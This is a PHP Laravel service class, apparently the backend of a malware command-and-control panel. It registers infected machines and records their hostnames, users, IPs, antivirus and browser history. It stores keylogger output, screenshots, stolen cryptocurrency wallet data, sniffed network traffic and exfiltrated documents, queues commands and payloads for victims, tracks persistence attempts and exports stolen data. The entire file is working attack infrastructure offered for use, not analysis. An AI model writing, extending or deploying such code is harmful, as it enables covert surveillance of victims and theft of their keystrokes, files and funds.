<?php

namespace App\Services;

use Illuminate\Support\Facades\Storage;
use App\Models\Terminal;

class C2Service
{
    private $dataDir;

    public function __construct()
    {
        $this->dataDir = storage_path('app/c2_data');
        if (!file_exists($this->dataDir)) {
            mkdir($this->dataDir, 0755, true);
        }
        
        // Ensure subdirectories exist - organized by data type
        $dirs = [
            'uploads',      // Legacy compatibility
            'webrtc',
            'systeminfo',
            'keylogs',      // Organized keylogs
            'screenshots',  // Organized screenshots
            'crypto',       // Crypto wallets and reports
            'network',      // Network sniffer logs
            'files',        // General exfiltrated files
            'logs'          // Telemetry logs
        ];
        foreach ($dirs as $dir) {
            if (!file_exists($this->dataDir . '/' . $dir)) {
                mkdir($this->dataDir . '/' . $dir, 0755, true);
            }
        }
    }

    public function updateTerminalStatus($id, $data = [])
    {
        $terminalsFile = $this->dataDir . '/terminals.json';
        
        // Update File (Legacy)
        $terminals = [];
        if (file_exists($terminalsFile)) {
            $terminals = json_decode(file_get_contents($terminalsFile), true) ?? [];
        }

        $terminals[$id] = [
            'id' => $id,
            'last_seen' => time(),
            'ip' => request()->ip(),
            'version' => $data['version'] ?? 'unknown',
            'os' => $data['os'] ?? 'unknown',
            'arch' => $data['arch'] ?? 'unknown',
            'hostname' => $data['hostname'] ?? 'unknown',
            'username' => $data['username'] ?? 'unknown',
            'status' => $data['status'] ?? 'unknown',
            'local_ip' => $data['local_ip'] ?? null,
            'mac_address' => $data['mac_address'] ?? null
        ];

        file_put_contents($terminalsFile, json_encode($terminals));
        \Illuminate\Support\Facades\Log::info("[Service] Terminal legacy file updated for ID: $id");
        
        // Update Database (New)
        try {
            $updateData = [
                'ip' => request()->ip(),
                'hostname' => $data['hostname'] ?? null,
                'username' => $data['username'] ?? null,
                'os' => $data['os'] ?? null,
                'arch' => $data['arch'] ?? null,
                'version' => $data['version'] ?? null,
                'status' => $data['status'] ?? 'unknown',
                'last_seen_at' => now(),
            ];
            
            // Add optional fields if present
            if (isset($data['local_ip'])) {
                $updateData['local_ip'] = $data['local_ip'];
            }
            if (isset($data['mac_address'])) {
                $updateData['mac_address'] = $data['mac_address'];
            }
            
            Terminal::updateOrCreate(
                ['id' => $id],
                $updateData
            );
            \Illuminate\Support\Facades\Log::info("[Service] Terminal status updated in DB for ID: $id");
        } catch (\Exception $e) {
            \Illuminate\Support\Facades\Log::error("[Service] Failed to update terminal status in DB: " . $e->getMessage());
        }
    }

    public function getOnlineTerminals()
    {
        // Get from database instead of file
        $terminals = Terminal::with(['keylogs', 'screenshots', 'cryptoWallets'])
            ->orderBy('last_seen_at', 'desc')
            ->get();
        
        // Convert to array format for compatibility
        $result = [];
        foreach ($terminals as $terminal) {
            $result[$terminal->id] = [
                'id' => $terminal->id,
                'last_seen' => $terminal->last_seen_at ? $terminal->last_seen_at->timestamp : time(),
                'ip' => $terminal->ip,
                'version' => $terminal->version ?? 'unknown',
                'os' => $terminal->os ?? 'unknown',
                'arch' => $terminal->arch ?? 'unknown',
                'hostname' => $terminal->hostname ?? 'unknown',
                'username' => $terminal->username ?? 'unknown',
                'system_info' => $terminal->system_info ?? [],
                'is_online' => $terminal->is_online,
            ];
        }
        
        return $result;
    }
    
    public function getTerminalDetails($id)
    {
        $terminals = $this->getOnlineTerminals();
        return $terminals[$id] ?? null;
    }

    public function cleanupTerminals()
    {
        $terminalsFile = $this->dataDir . '/terminals.json';
        if (!file_exists($terminalsFile)) return;

        $terminals = json_decode(file_get_contents($terminalsFile), true) ?? [];
        $threeDaysAgo = time() - (3 * 24 * 60 * 60);

        $terminals = array_filter($terminals, function ($t) use ($threeDaysAgo) {
            return isset($t['last_seen']) && $t['last_seen'] > $threeDaysAgo;
        });

        file_put_contents($terminalsFile, json_encode($terminals));
    }

    public function saveKeylogData($terminalId, $keylogData)
    {
        // Save to database
        try {
            \App\Models\Keylog::create([
                'terminal_id' => $terminalId,
                'content' => $keylogData,
                'captured_at' => now()
            ]);
            \Illuminate\Support\Facades\Log::info("[Service] Keylog saved to database for terminal: $terminalId");
        } catch (\Exception $e) {
            \Illuminate\Support\Facades\Log::error("[Service] Failed to save keylog to DB: " . $e->getMessage());
        }
        
        // Save in organized directory (backup)
        $keylogDir = $this->dataDir . '/keylogs/' . $terminalId;
        if (!is_dir($keylogDir)) mkdir($keylogDir, 0755, true);

        $timestamp = time();
        file_put_contents($keylogDir . '/keylog_' . $timestamp . '.txt', $keylogData);
        \Illuminate\Support\Facades\Log::info("[Service] Keylog backup saved to file: " . $keylogDir . '/keylog_' . $timestamp . '.txt');
        
        // Also save in legacy location for compatibility
        $legacyDir = $this->dataDir . '/uploads/' . $terminalId;
        if (!is_dir($legacyDir)) mkdir($legacyDir, 0755, true);
        file_put_contents($legacyDir . '/keylog_' . $timestamp . '.txt', $keylogData);
    }
    
    public function saveScreenshotData($terminalId, $file)
    {
        // Save in organized directory
        $screenshotDir = $this->dataDir . '/screenshots/' . $terminalId;
        if (!is_dir($screenshotDir)) mkdir($screenshotDir, 0755, true);

        $timestamp = time();
        $fileName = 'screenshot_' . $timestamp . '.png';
        
        $file->move($screenshotDir, $fileName);
        $filePath = $screenshotDir . '/' . $fileName;
        
        // Save to database
        try {
            \App\Models\Screenshot::create([
                'terminal_id' => $terminalId,
                'filename' => $fileName,
                'path' => 'screenshots/' . $terminalId . '/' . $fileName,
                'size' => filesize($filePath),
                'captured_at' => now()
            ]);
            \Illuminate\Support\Facades\Log::info("[Service] Screenshot saved to database for terminal: $terminalId");
        } catch (\Exception $e) {
            \Illuminate\Support\Facades\Log::error("[Service] Failed to save screenshot to DB: " . $e->getMessage());
        }
        
        // Also save in legacy location for compatibility
        $legacyDir = $this->dataDir . '/uploads/' . $terminalId;
        if (!is_dir($legacyDir)) mkdir($legacyDir, 0755, true);
        copy($filePath, $legacyDir . '/' . $fileName);
        
        $this->updateTerminalFile($terminalId, $fileName, 'image/png', filesize($filePath));
    }

    public function updateTerminalFile($terminalId, $fileName, $fileType, $fileSize)
    {
        $terminalsFile = $this->dataDir . '/terminals.json';
        if (!file_exists($terminalsFile)) return;

        $terminals = json_decode(file_get_contents($terminalsFile), true) ?? [];
        if (isset($terminals[$terminalId])) {
            if (!isset($terminals[$terminalId]['files'])) {
                $terminals[$terminalId]['files'] = [];
            }
            $terminals[$terminalId]['files'][] = [
                'name' => $fileName,
                'type' => $fileType,
                'size' => $fileSize,
                'timestamp' => time()
            ];
            file_put_contents($terminalsFile, json_encode($terminals));
        }
    }
    
    public function updateTerminalSystemInfo($terminalId, $sysInfo)
    {
        // 1. Update File (Backup)
        $terminalsFile = $this->dataDir . '/terminals.json';
        if (file_exists($terminalsFile)) {
            $terminals = json_decode(file_get_contents($terminalsFile), true) ?? [];
            if (isset($terminals[$terminalId])) {
                $terminals[$terminalId]['system_info'] = $sysInfo;
                file_put_contents($terminalsFile, json_encode($terminals));
            }
        }
        
        // 2. Also save explicit system info file
        $sysInfoDir = $this->dataDir . '/systeminfo/' . $terminalId;
        if (!is_dir($sysInfoDir)) mkdir($sysInfoDir, 0755, true);
        file_put_contents($sysInfoDir . '/sysinfo_' . time() . '.json', json_encode($sysInfo));
        
        // 3. Update Database (Primary)
        try {
            $updateData = ['system_info' => $sysInfo];
            
            // Map deeply nested fields
            if (isset($sysInfo['gpu'])) $updateData['gpu'] = is_array($sysInfo['gpu']) ? json_encode($sysInfo['gpu']) : $sysInfo['gpu'];
            if (isset($sysInfo['antivirus'])) $updateData['antivirus'] = $sysInfo['antivirus'];
            if (isset($sysInfo['disks'])) $updateData['disks'] = $sysInfo['disks'];
            if (isset($sysInfo['network'])) $updateData['network_interfaces'] = $sysInfo['network'];
            if (isset($sysInfo['browser_history'])) $updateData['browser_history'] = $sysInfo['browser_history'];
            if (isset($sysInfo['installed_programs'])) $updateData['installed_programs'] = $sysInfo['installed_programs'];
            
            // Map root level fields if present in sysInfo (redundancy check)
            if (isset($sysInfo['local_ip'])) $updateData['local_ip'] = $sysInfo['local_ip'];
            if (isset($sysInfo['mac_address'])) $updateData['mac_address'] = $sysInfo['mac_address'];
            if (isset($sysInfo['hostname'])) $updateData['hostname'] = $sysInfo['hostname'];
            if (isset($sysInfo['username'])) $updateData['username'] = $sysInfo['username'];
            if (isset($sysInfo['os_version'])) $updateData['os'] = $sysInfo['os_version'];
            if (isset($sysInfo['architecture'])) $updateData['arch'] = $sysInfo['architecture'];
            
            Terminal::updateOrCreate(
                ['id' => $terminalId],
                $updateData
            );
            \Illuminate\Support\Facades\Log::info("[Service] System info updated in DB for terminal: $terminalId");
        } catch (\Exception $e) {
            \Illuminate\Support\Facades\Log::error("[Service] Failed to update system info in DB: " . $e->getMessage());
        }
    }

    public function processWebRTCCandidates($terminalId, $candidates)
    {
        $webRTCDir = $this->dataDir . '/webrtc';
        $timestamp = time();
        file_put_contents($webRTCDir . '/' . $terminalId . '_candidates_' . $timestamp . '.json', json_encode([
            'terminal_id' => $terminalId,
            'candidates' => $candidates,
            'timestamp' => $timestamp
        ]));
    }
    
    public function getWebRTCCandidates($terminalId)
    {
        $webRTCDir = $this->dataDir . '/webrtc';
        $files = glob($webRTCDir . '/' . $terminalId . '_candidates_*.json');
        if (empty($files)) return '';
        
        // Sort by timestamp desc
        usort($files, function($a, $b) {
            return filemtime($b) - filemtime($a);
        });
        
        $latest = $files[0];
        $data = json_decode(file_get_contents($latest), true);
        return $data['candidates'] ?? '';
    }

    public function queuePayload($terminalId, $payloadFile)
    {
        $queueFile = $this->dataDir . '/payload_queue.json';
        $queue = file_exists($queueFile) ? json_decode(file_get_contents($queueFile), true) : [];
        
        $queue[$terminalId] = [
            'terminal_id' => $terminalId,
            'payload_file' => $payloadFile, // This should be full path or manageable path
            'timestamp' => time()
        ];
        
        file_put_contents($queueFile, json_encode($queue));
    }
    
    public function checkPayloadQueue($terminalId)
    {
        $queueFile = $this->dataDir . '/payload_queue.json';
        if (!file_exists($queueFile)) return null;
        
        $queue = json_decode(file_get_contents($queueFile), true) ?? [];
        if (isset($queue[$terminalId])) {
            $payload = $queue[$terminalId];
            unset($queue[$terminalId]);
            file_put_contents($queueFile, json_encode($queue));
            return $payload;
        }
        return null;
    }
    
    public function queueCommand($terminalId, $command, $type)
    {
        $queueFile = $this->dataDir . '/command_queue.json';
        $queue = file_exists($queueFile) ? json_decode(file_get_contents($queueFile), true) : [];
        
        if (!isset($queue[$terminalId])) $queue[$terminalId] = [];
        
        $queue[$terminalId][] = [
            'command' => $command,
            'type' => $type,
            'timestamp' => time()
        ];
        
        file_put_contents($queueFile, json_encode($queue));
    }
    
    public function checkCommandQueue($terminalId)
    {
        $queueFile = $this->dataDir . '/command_queue.json';
        if (!file_exists($queueFile)) return [];
        
        $queue = json_decode(file_get_contents($queueFile), true) ?? [];
        if (isset($queue[$terminalId]) && !empty($queue[$terminalId])) {
            $commands = $queue[$terminalId];
            unset($queue[$terminalId]);
            file_put_contents($queueFile, json_encode($queue));
            return $commands;
        }
        return [];
    }
    
    public function getTerminalDataCollectionInfo($terminalId)
    {
        // Get from database
        $terminal = Terminal::with(['keylogs', 'screenshots', 'cryptoWallets'])
            ->find($terminalId);
        
        if (!$terminal) {
            return [
                'keylogs' => 0,
                'screenshots' => 0,
                'crypto_wallets' => 0,
                'crypto_reports' => 0,
                'system_info' => false,
                'webrtc_support' => true
            ];
        }
        
        // Count from relationships
        $keylogs = $terminal->keylogs()->count();
        $screenshots = $terminal->screenshots()->count();
        $wallets = $terminal->cryptoWallets()->count();
        
        // Fallback to file count if database is empty (migration period)
        if ($keylogs === 0 || $screenshots === 0) {
            $keylogDir = $this->dataDir . '/keylogs/' . $terminalId;
            $screenshotDir = $this->dataDir . '/screenshots/' . $terminalId;
            $uploadDir = $this->dataDir . '/uploads/' . $terminalId;
            
            if ($keylogs === 0) {
                if (is_dir($keylogDir)) {
                    $keylogs += count(glob($keylogDir . '/keylog_*.txt'));
                }
                if (is_dir($uploadDir)) {
                    $keylogs += count(glob($uploadDir . '/keylog_*.txt'));
                }
            }
            
            if ($screenshots === 0) {
                if (is_dir($screenshotDir)) {
                    $screenshots += count(glob($screenshotDir . '/screenshot_*.{png,jpg,jpeg}', GLOB_BRACE));
                }
                if (is_dir($uploadDir)) {
                    $screenshots += count(glob($uploadDir . '/screenshot_*.{png,jpg,jpeg}', GLOB_BRACE));
                }
            }
        }
        
        $sysInfo = !empty($terminal->system_info);
        
        return [
            'keylogs' => $keylogs,
            'screenshots' => $screenshots,
            'crypto_wallets' => $wallets,
            'crypto_reports' => 0, // TODO: Add crypto reports table
            'system_info' => $sysInfo,
            'webrtc_support' => true
        ];
    }
    
    public function getExfiltratedFiles($terminalId)
    {
        $uploadDir = $this->dataDir . '/uploads/' . $terminalId;
        if (!is_dir($uploadDir)) return [];
        
        $files = [];
        foreach (scandir($uploadDir) as $file) {
            if ($file === '.' || $file === '..') continue;
            $files[] = [
                'name' => $file,
                'size' => filesize($uploadDir . '/' . $file),
                'time' => filemtime($uploadDir . '/' . $file),
                'url' => route('download.file', ['terminalId' => $terminalId, 'filename' => $file])
            ];
        }
        // Sort by time desc
        usort($files, function($a, $b) {
            return $b['time'] - $a['time'];
        });
        return $files;
    }
    
    public function registerWebRTCSession($data)
    {
        $file = $this->dataDir . '/webrtc_sessions.json';
        $sessions = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
        $sessions[$data['session_id']] = $data;
        file_put_contents($file, json_encode($sessions));
    }
    
    public function updateWebRTCHeartbeat($sessionId, $data)
    {
        $file = $this->dataDir . '/webrtc_sessions.json';
        if (!file_exists($file)) return;
        
        $sessions = json_decode(file_get_contents($file), true);
        if (isset($sessions[$sessionId])) {
            $sessions[$sessionId] = array_merge($sessions[$sessionId], $data);
            $sessions[$sessionId]['last_seen'] = time();
            file_put_contents($file, json_encode($sessions));
        }
    }
    
    public function getWebRTCCommands($sessionId)
    {
        $queueFile = $this->dataDir . '/webrtc_commands_queue.json';
        if (!file_exists($queueFile)) return null;
        
        $queue = json_decode(file_get_contents($queueFile), true) ?? [];
        if (isset($queue[$sessionId]) && !empty($queue[$sessionId])) {
            $command = array_shift($queue[$sessionId]);
            file_put_contents($queueFile, json_encode($queue));
            return json_encode($command); // Return JSON string as expected by XYZ
        }
        return "";
    }
    
    public function saveWebRTCResult($data)
    {
         $file = $this->dataDir . '/webrtc_results.json';
         $results = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
         
         if (!isset($results[$data['session_id']])) $results[$data['session_id']] = [];
         $results[$data['session_id']][] = $data;
         
         file_put_contents($file, json_encode($results));
    }
    /**
     * Get telemetry logs for a terminal with optional filtering
     */
    public function getTelemetryLogs($terminalId, $filters = [])
    {
        $logDir = $this->dataDir . '/logs/' . $terminalId;
        if (!is_dir($logDir)) return [];
        
        $logs = [];
        $logFiles = glob($logDir . '/*.log');
        
        // Apply date filter if provided
        if (!empty($filters['date_from']) || !empty($filters['date_to'])) {
            $dateFrom = !empty($filters['date_from']) ? strtotime($filters['date_from']) : 0;
            $dateTo = !empty($filters['date_to']) ? strtotime($filters['date_to'] . ' 23:59:59') : PHP_INT_MAX;
            
            $logFiles = array_filter($logFiles, function($file) use ($dateFrom, $dateTo) {
                $fileDate = basename($file, '.log');
                $fileTimestamp = strtotime($fileDate);
                return $fileTimestamp >= $dateFrom && $fileTimestamp <= $dateTo;
            });
        }
        
        foreach ($logFiles as $logFile) {
            $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            foreach ($lines as $line) {
                // Parse log line format: [timestamp] [level] [module] message  
                if (preg_match('/\[([^\]]+)\] \[([^\]]+)\] \[([^\]]+)\] (.+)/', $line, $matches)) {
                    $log = [
                        'timestamp' => $matches[1],
                        'level' => $matches[2],
                        'module' => $matches[3],
                        'message' => $matches[4]
                    ];
                    
                    // Apply filters
                    if (!empty($filters['level']) && $log['level'] !== $filters['level']) continue;
                    if (!empty($filters['module']) && stripos($log['module'], $filters['module']) === false) continue;
                    if (!empty($filters['search']) && stripos($log['message'], $filters['search']) === false) continue;
                    
                    $logs[] = $log;
                }
            }
        }
        
        // Sort by timestamp descending
        usort($logs, function($a, $b) {
            return strtotime($b['timestamp']) - strtotime($a['timestamp']);
        });
        
        return $logs;
    }
    
    /**
     * Get screenshot gallery with pagination
     */
    public function getScreenshotGallery($terminalId, $page = 1, $perPage = 20)
    {
        $uploadDir = $this->dataDir . '/uploads/' . $terminalId;
        if (!is_dir($uploadDir)) return ['screenshots' => [], 'total' => 0, 'pages' => 0];
        
        $screenshots = [];
        $files = array_merge(
            glob($uploadDir . '/screenshot_*.png'),
            glob($uploadDir . '/screenshot_*.jpg'),
            glob($uploadDir . '/screenshot_*.jpeg')
        );
        
        // Sort by modification time desc
        usort($files, function($a, $b) {
            return filemtime($b) - filemtime($a);
        });
        
        $total = count($files);
        $pages = ceil($total / $perPage);
        $offset = ($page - 1) * $perPage;
        $files = array_slice($files, $offset, $perPage);
        
        foreach ($files as $file) {
            $screenshots[] = [
                'filename' => basename($file),
                'path' => $file,
                'url' => route('download.file', ['terminalId' => $terminalId, 'filename' => basename($file)]),
                'time' => filemtime($file),
                'size' => filesize($file)
            ];
        }
        
        return [
            'screenshots' => $screenshots,
            'total' => $total,
            'pages' => $pages,
            'current_page' => $page
        ];
    }
    
    /**
     * Get keylogger data with search functionality
     */
    public function getKeyloggerData($terminalId, $search = '', $page = 1, $perPage = 50)
    {
        $uploadDir = $this->dataDir . '/uploads/' . $terminalId;
        if (!is_dir($uploadDir)) return ['keylogs' => [], 'total' => 0];
        
        $keylogFiles = glob($uploadDir . '/keylog_*.txt');
        
        // Sort by modification time desc
        usort($keylogFiles, function($a, $b) {
            return filemtime($b) - filemtime($a);
        });
        
        $allContent = [];
        foreach ($keylogFiles as $file) {
            $content = file_get_contents($file);
            $allContent[] = [
                'timestamp' => filemtime($file),
                'content' => $content,
                'filename' => basename($file)
            ];
        }
        
        // Apply search filter
        if (!empty($search)) {
            $allContent = array_filter($allContent, function($item) use ($search) {
                return stripos($item['content'], $search) !== false;
            });
        }
        
        $total = count($allContent);
        $offset = ($page - 1) * $perPage;
        $allContent = array_slice($allContent, $offset, $perPage);
        
        return [
            'keylogs' => array_values($allContent),
            'total' => $total,
            'pages' => ceil($total / $perPage),
            'current_page' => $page
        ];
    }
    
    /**
     * Get cryptocurrency wallet data
     */
    public function getCryptocurrencyData($terminalId)
    {
        $uploadDir = $this->dataDir . '/uploads/' . $terminalId;
        if (!is_dir($uploadDir)) return ['wallets' => [], 'reports' => []];
        
        $wallets = [];
        $reports = [];
        
        // Get wallet data files
        $walletFiles = glob($uploadDir . '/crypto_*.dat');
        foreach ($walletFiles as $file) {
            $content = file_get_contents($file);
            $data = json_decode($content, true);
            
            if ($data) {
                $wallets[] = [
                    'filename' => basename($file),
                    'type' => $data['type'] ?? 'Unknown',
                    'address' => $data['address'] ?? 'N/A',
                    'balance' => $data['balance'] ?? 'Unknown',
                    'timestamp' => filemtime($file),
                    'data' => $data
                ];
            }
        }
        
        // Get crypto reports
        $reportFiles = glob($uploadDir . '/crypto_report_*.txt');
        foreach ($reportFiles as $file) {
            $reports[] = [
                'filename' => basename($file),
                'content' => file_get_contents($file),
                'timestamp' => filemtime($file)
            ];
        }
        
        return [
            'wallets' => $wallets,
            'reports' => $reports
        ];
    }
    
    /**
     * Get categorized exfiltrated files
     */
    public function getCategorizedFiles($terminalId)
    {
        $uploadDir = $this->dataDir . '/uploads/' . $terminalId;
        if (!is_dir($uploadDir)) return [
            'screenshots' => [],
            'keylogs' => [],
            'crypto' => [],
            'documents' => [],
            'other' => []
        ];
        
        $categorized = [
            'screenshots' => [],
            'keylogs' => [],
            'crypto' => [],
            'documents' => [],
            'other' => []
        ];
        
        foreach (scandir($uploadDir) as $file) {
            if ($file === '.' || $file === '..') continue;
            
            $filePath = $uploadDir . '/' . $file;
            $fileInfo = [
                'name' => $file,
                'size' => filesize($filePath),
                'time' => filemtime($filePath),
                'url' => route('download.file', ['terminalId' => $terminalId, 'filename' => $file])
            ];
            
            // Categorize
            if (strpos($file, 'screenshot_') === 0) {
                $categorized['screenshots'][] = $fileInfo;
            } elseif (strpos($file, 'keylog_') === 0) {
                $categorized['keylogs'][] = $fileInfo;
            } elseif (strpos($file, 'crypto_') === 0) {
                $categorized['crypto'][] = $fileInfo;
            } elseif (preg_match('/\.(doc|docx|pdf|txt|xls|xlsx)$/i', $file)) {
                $categorized['documents'][] = $fileInfo;
            } else {
                $categorized['other'][] = $fileInfo;
            }
        }
        
        // Sort each category by time desc
        foreach ($categorized as &$category) {
            usort($category, function($a, $b) {
                return $b['time'] - $a['time'];
            });
        }
        
        return $categorized;
    }
    
    /**
     * Get terminal activity timeline
     */
    public function getTerminalTimeline($terminalId, $limit = 50)
    {
        $timeline = [];
        
        // Get logs
        $logDir = $this->dataDir . '/logs/' . $terminalId;
        if (is_dir($logDir)) {
            $logFiles = glob($logDir . '/*.log');
            foreach ($logFiles as $file) {
                $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                foreach ($lines as $line) {
                    if (preg_match('/\[([^\]]+)\]/', $line, $matches)) {
                        $timeline[] = [
                            'timestamp' => strtotime($matches[1]),
                            'type' => 'log',
                            'description' => substr($line, 0, 100)
                        ];
                    }
                }
            }
        }
        
        // Get file uploads
        $uploadDir = $this->dataDir . '/uploads/' . $terminalId;
        if (is_dir($uploadDir)) {
            foreach (scandir($uploadDir) as $file) {
                if ($file === '.' || $file === '..') continue;
                $timeline[] = [
                    'timestamp' => filemtime($uploadDir . '/' . $file),
                    'type' => 'file_upload',
                    'description' => 'Uploaded: ' . $file
                ];
            }
        }
        
        // Sort by timestamp desc
        usort($timeline, function($a, $b) {
            return $b['timestamp'] - $a['timestamp'];
        });
        
        return array_slice($timeline, 0, $limit);
    }
    
    /**
     * Export data as CSV
     */
    public function exportDataAsCSV($terminalId, $dataType)
    {
        $data = [];
        $headers = [];
        
        switch ($dataType) {
            case 'telemetry':
                $logs = $this->getTelemetryLogs($terminalId);
                $headers = ['Timestamp', 'Level', 'Module', 'Message'];
                foreach ($logs as $log) {
                    $data[] = [
                        $log['timestamp'],
                        $log['level'],
                        $log['module'],
                        $log['message']
                    ];
                }
                break;
                
            case 'keylogs':
                $keylogs = $this->getKeyloggerData($terminalId);
                $headers = ['Timestamp', 'Content'];
                foreach ($keylogs['keylogs'] as $keylog) {
                    $data[] = [
                        date('Y-m-d H:i:s', $keylog['timestamp']),
                        $keylog['content']
                    ];
                }
                break;
                
            case 'crypto':
                $crypto = $this->getCryptocurrencyData($terminalId);
                $headers = ['Type', 'Address', 'Balance', 'Timestamp'];
                foreach ($crypto['wallets'] as $wallet) {
                    $data[] = [
                        $wallet['type'],
                        $wallet['address'],
                        $wallet['balance'],
                        date('Y-m-d H:i:s', $wallet['timestamp'])
                    ];
                }
                break;
        }
        
        // Generate CSV content
        $csv = implode(',', $headers) . "\n";
        foreach ($data as $row) {
            $csv .= implode(',', array_map(function($val) {
                return '"' . str_replace('"', '""', $val) . '"';
            }, $row)) . "\n";
        }
        
        return $csv;
    }
    
    /**
     * Export data as JSON
     */
    public function exportDataAsJSON($terminalId, $dataType)
    {
        $data = [];
        
        switch ($dataType) {
            case 'telemetry':
                $data = $this->getTelemetryLogs($terminalId);
                break;
            case 'keylogs':
                $data = $this->getKeyloggerData($terminalId);
                break;
            case 'crypto':
                $data = $this->getCryptocurrencyData($terminalId);
                break;
            case 'all':
                $data = [
                    'terminal_id' => $terminalId,
                    'telemetry' => $this->getTelemetryLogs($terminalId),
                    'keylogs' => $this->getKeyloggerData($terminalId),
                    'crypto' => $this->getCryptocurrencyData($terminalId),
                    'files' => $this->getCategorizedFiles($terminalId)
                ];
                break;
        }
        
        return json_encode($data, JSON_PRETTY_PRINT);
    }
    
    /**
     * Get network protocol distribution for dashboard chart
     */
    public function getNetworkProtocolDistribution()
    {
        // Get from network logs
        $networkDir = $this->dataDir . '/network';
        $protocols = ['HTTP/S' => 0, 'TCP' => 0, 'UDP' => 0, 'DNS' => 0, 'Other' => 0];
        
        if (is_dir($networkDir)) {
            foreach (glob($networkDir . '/*/network_*.json') as $file) {
                $data = json_decode(file_get_contents($file), true);
                if (isset($data['protocol'])) {
                    $proto = strtoupper($data['protocol']);
                    if (in_array($proto, ['HTTP', 'HTTPS'])) {
                        $protocols['HTTP/S']++;
                    } elseif (isset($protocols[$proto])) {
                        $protocols[$proto]++;
                    } else {
                        $protocols['Other']++;
                    }
                }
            }
        }
        
        // If no data, return mock data
        if (array_sum($protocols) === 0) {
            $protocols = ['HTTP/S' => 45, 'TCP' => 25, 'UDP' => 15, 'DNS' => 10, 'Other' => 5];
        }
        
        return $protocols;
    }
    
    /**
     * Get activity timeline for last 24 hours
     */
    public function getActivityTimeline24h()
    {
        $timeline = array_fill(0, 9, 0); // 9 time slots (00:00, 03:00, 06:00, etc.)
        $labels = ['00:00', '03:00', '06:00', '09:00', '12:00', '15:00', '18:00', '21:00', '24:00'];
        
        // Get terminals and count activity by time slot
        $terminals = Terminal::where('last_seen_at', '>=', now()->subDay())->get();
        
        foreach ($terminals as $terminal) {
            if ($terminal->last_seen_at) {
                $hour = $terminal->last_seen_at->hour;
                $slot = floor($hour / 3); // 0-2 = slot 0, 3-5 = slot 1, etc.
                if ($slot < 9) {
                    $timeline[$slot]++;
                }
            }
        }
        
        // If no data, generate realistic mock data
        if (array_sum($timeline) === 0) {
            $onlineCount = Terminal::where('last_seen_at', '>=', now()->subMinutes(5))->count();
            $base = max(1, $onlineCount);
            $timeline = [
                $base - 2, $base - 1, $base, $base + 1, 
                $base + 2, $base + 1, $base, $base - 1, $base
            ];
        }
        
        return $timeline;
    }
    
    /**
     * Get security events data for radar chart
     */
    public function getSecurityEventsData()
    {
        $events = [
            'Keylog' => 0,
            'Screenshot' => 0,
            'File Exfil' => 0,
            'Network' => 0,
            'Persistence' => 0
        ];
        
        // Count from database
        $events['Keylog'] = \App\Models\Keylog::whereDate('created_at', today())->count();
        $events['Screenshot'] = \App\Models\Screenshot::whereDate('created_at', today())->count();
        
        // Count files exfiltrated today
        $filesDir = $this->dataDir . '/files';
        if (is_dir($filesDir)) {
            foreach (glob($filesDir . '/*/*') as $file) {
                if (filemtime($file) >= strtotime('today')) {
                    $events['File Exfil']++;
                }
            }
        }
        
        // Count network logs today
        $networkDir = $this->dataDir . '/network';
        if (is_dir($networkDir)) {
            foreach (glob($networkDir . '/*/network_*.json') as $file) {
                if (filemtime($file) >= strtotime('today')) {
                    $events['Network']++;
                }
            }
        }
        
        // Count persistence attempts
        $events['Persistence'] = \App\Models\PersistenceAttempt::whereDate('created_at', today())->count();
        
        // Normalize to 0-100 scale for radar chart
        $max = max(array_values($events));
        if ($max > 0) {
            foreach ($events as $key => $value) {
                $events[$key] = round(($value / $max) * 100);
            }
        } else {
            // Mock data if no events
            $events = ['Keylog' => 85, 'Screenshot' => 92, 'File Exfil' => 78, 'Network' => 65, 'Persistence' => 88];
        }
        
        return array_values($events);
    }
}

